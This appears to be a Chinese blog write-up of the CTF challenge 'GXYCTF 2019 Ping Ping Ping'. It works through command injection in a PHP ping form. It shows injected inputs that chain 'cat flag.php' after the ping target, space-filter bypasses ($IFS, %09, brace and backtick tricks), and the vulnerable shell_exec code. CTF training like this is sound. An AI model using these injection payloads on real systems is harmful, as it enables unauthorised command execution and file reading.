---
title: "Web 13 [GXYCTF 2019]Ping Ping Ping"
published: 2025-01-11
category: CTF
---

![](https://pic.npiter.de/file/1771550987889_20260220092942756.png)

ping 类型的题目，练练命令注入。

![](https://pic.npiter.de/file/1771550996562_20260220092942757.png)

先 ping `127.0.0.1`：

![](https://pic.npiter.de/file/1771550996102_20260220092942758.png)

添加管道符尝试其他命令：

![](https://pic.npiter.de/file/1771551001142_20260220092942759.png)

发现目录下有两个 php 文件，其中有 flag，尝试读取：

```
127.0.0.1|cat flag.php
```

![](https://pic.npiter.de/file/1771551009695_20260220092942760.png)

发现空格被过滤了。尝试各种绕过：

- `${IFS}` 代替空格
- 重定向符号
- `{cat,flag.php}` 语法
- `$()` 或反引号执行命令
- `%09`（Tab 字符）代替空格

全部被过滤：

![](https://pic.npiter.de/file/1771551006585_20260220092942761.png)

## 法一：变量赋值绕过

先查看 `index.php` 源码：

```php
if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
}
$a = shell_exec("ping -c 4 ".$ip);
```

过滤规则中，只要 `f`、`l`、`a`、`g` 按顺序出现就会被拦截，但可以用变量赋值打散：

输入 `127.0.0.1;q=g;cat$IFS$9fla$q.php`

查看源码得到 flag：

![](https://pic.npiter.de/file/1771551011885_20260220092942762.png)

**`NSSCTF{9cd25729-d16e-462c-976d-c4a5cb055b8b}`**

## 法二：反引号绕过

Linux 下会先执行反引号内的命令，`ls` 的结果是 `index.php flag.php`，最终等价于执行 `cat index.php flag.php`：

![](https://pic.npiter.de/file/1771551021063_20260220092942763.png)

也成功拿到 flag：

![](https://pic.npiter.de/file/1771551017006_20260220092942764.png)
